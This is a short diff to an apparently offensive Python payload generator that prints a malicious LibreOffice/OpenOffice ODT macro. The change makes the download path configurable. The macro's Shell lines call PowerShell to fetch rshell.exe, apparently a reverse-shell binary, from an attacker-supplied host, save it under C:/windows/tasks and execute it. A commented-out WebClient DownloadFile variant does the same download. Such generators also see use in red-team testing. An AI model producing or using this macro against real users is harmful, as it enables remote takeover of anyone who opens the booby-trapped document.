@@ -109,7 +109,7 @@ print("\n\n------------------LIBREOFFICE-OPENOFFICE-ODT-------------------------
 print('Sub Main')
 # print('    Shell("cmd /c powershell -ep bypass -c (New-Object System.Net.WebClient).DownloadFile(\'http://' + args.host + '/win/rshell.exe\', \'rshell.exe\')")')     #Doesn't work, syntax issues
 
-print('    Shell("cmd /c powershell iwr \'http://' + args.host + '/win/rshell.exe\' -o \'C:/windows/tasks/rshell.exe\'")')
+print('    Shell("cmd /c powershell iwr \'http://' + args.host + args.rshell_path + '\' -o \'C:/windows/tasks/rshell.exe\'")')
 print('    Shell("cmd /c \'C:/windows/tasks/rshell.exe\'")')
 print('End Sub')
 
